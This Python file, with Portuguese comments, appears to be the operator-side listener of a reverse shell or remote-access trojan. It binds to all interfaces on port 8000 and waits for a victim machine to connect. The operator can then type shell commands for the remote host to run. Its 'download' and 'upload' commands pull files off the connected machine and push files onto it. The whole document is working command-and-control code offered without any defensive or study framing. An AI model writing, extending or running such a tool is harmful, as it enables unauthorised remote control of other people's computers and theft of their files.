import socket

def start_server(host="0.0.0.0", port=8000):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"[+] Escultando no IP:{host} /  PORTA:{port}")

    client_socket, client_address = server.accept()
    print(f"[+] Conecção Estabelecida Com {client_address}")

    while True:
        try:
            command = input("DIGITE: ").strip()
            if command.lower() == "exit":
                client_socket.send("exit".encode())
                break

            # Comando de download (receber arquivo do cliente)
            if command.startswith("download "):
                client_socket.send(command.encode())
                file_data = b""
                while True:
                    chunk = client_socket.recv(4096)
                    if chunk.endswith(b"EOF"):
                        file_data += chunk[:-3]  # Remove o marcador EOF
                        break
                    file_data += chunk
                file_name = command.split(" ", 1)[1].split("\\")[-1]
                with open(file_name, "wb") as file:
                    file.write(file_data)
                print(f"[+] File '{file_name}' download Completo.")
                continue

            # Comando de upload (enviar arquivo para o cliente)
            if command.startswith("upload "):
                client_socket.send(command.encode())
                file_path = command.split(" ", 1)[1]
                try:
                    with open(file_path, "rb") as file:
                        while chunk := file.read(4096):
                            client_socket.send(chunk)
                        client_socket.send(b"EOF")  # Indica o fim do arquivo
                    print(f"[+] File '{file_path}' upload Completo.")
                except FileNotFoundError:
                    print(f"[-] File '{file_path}' Não Encontrado")
                    client_socket.send(b"Error: File not foundEOF")
                continue

            # Enviar outros comandos
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode("utf-8")
            print(response)
        except Exception as e:
            print(f"[-] Error: {e}")
            break

    client_socket.close()
    server.close()

if __name__ == "__main__":
    start_server()
